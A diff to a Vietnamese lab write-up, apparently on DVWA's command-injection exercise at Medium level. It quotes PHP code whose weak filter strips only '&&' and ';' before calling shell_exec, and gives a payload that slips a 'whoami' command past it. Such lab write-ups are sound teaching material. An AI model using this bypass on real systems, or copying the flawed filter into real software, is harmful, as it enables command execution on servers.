@@ -44,9 +44,27 @@ Trang web trả về kết quả của lệnh `whoami` (ví dụ: `www-data`).
 
 ## Security level: Medium
 ### Method 
+- Level này `parameter` 'ip' đã được kiểm tra, nhưng filter rất đơn giản. 
 ### Mã nguồn gây lỗi (Vulnerable Code)
+```
+$substitutions = array(
+                                    '&&' => '',
+                                    ';'  => '',
+            );
+            $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+            $cmd = shell_exec( 'ping  ' . $target );
+```
 ### Các bước khai thác (Proof of Concept)
+
+- **Payload:**  
+```bash
+127.0.0.1 &;& whoami
+```
+- **Kết quả mong đợi:**  
+Trang web trả về kết quả của lệnh `whoami`
+
 ### Screenshots
+<img width="2559" height="1335" alt="image" src="https://github.com/user-attachments/assets/b001397c-d73f-40af-a211-0b7a1e1088c1" />
 ### Mô tả
 
 
